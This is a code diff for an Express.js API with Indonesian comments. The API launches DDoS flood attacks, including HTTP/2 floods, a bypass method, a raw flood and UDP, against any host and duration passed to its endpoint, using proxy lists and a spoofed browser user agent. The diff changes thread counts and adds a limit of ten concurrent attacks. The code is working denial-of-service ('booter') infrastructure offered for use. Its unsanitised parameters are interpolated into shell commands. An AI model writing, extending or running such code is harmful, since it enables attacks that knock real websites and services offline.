@@ -17,12 +17,13 @@ const methods = {
 };
 
 const activeProcesses = new Map();
+const MAX_CONCURRENT_ATTACKS = 10;  // Batas maksimum serangan yang berjalan bersamaan
 
 // Fungsi untuk menghasilkan perintah berdasarkan metode serangan
 const generateCommand = (method, host, port, time) => {
     switch (method) {
         case 'H2FLASH':
-            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 2 proxy.txt`;
+            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
@@ -38,7 +39,7 @@ const generateCommand = (method, host, port, time) => {
         case 'RAW':
             return `cd /root/methods && node Raw.js ${host} ${time}`;
         case 'H2BYPASS':
-            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
+            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2MERIS':
             return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
@@ -71,6 +72,11 @@ app.get('/api', (req, res) => {
     // Validasi parameter host, port, dan time
     if (!host || !port || !time) {
         return res.status(400).json({ error: 'Missing host, port, or time parameter' });
+    }
+
+    // Memeriksa apakah jumlah serangan yang aktif sudah mencapai batas
+    if (activeProcesses.size >= MAX_CONCURRENT_ATTACKS) {
+        return res.status(429).json({ error: 'Concurrent attack limit reached' }); // HTTP 429: Too Many Requests
     }
 
     // Menjalankan serangan berdasarkan metode yang dipilih
